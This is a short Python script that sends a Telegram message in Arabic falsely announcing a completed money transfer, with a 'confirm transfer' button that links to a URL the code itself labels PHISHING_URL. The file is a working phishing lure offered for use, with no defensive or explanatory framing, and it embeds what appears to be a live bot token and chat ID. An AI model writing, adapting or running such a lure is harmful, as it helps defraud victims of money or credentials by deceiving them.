
import requests

BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
CHAT_ID = '7485197107'
PHISHING_URL = 'https://yourproject.onrender.com'

message = "📥 تم إرسال تحويل بنجاح. لتأكيد التحويل، يرجى الضغط على الزر أدناه."
button_text = "تأكيد التحويل"

requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
    'chat_id': CHAT_ID,
    'text': message,
    'reply_markup': f'''{{
        "inline_keyboard": [[
            {{"text": "{button_text}", "url": "{PHISHING_URL}"}}
        ]]
    }}'''
})
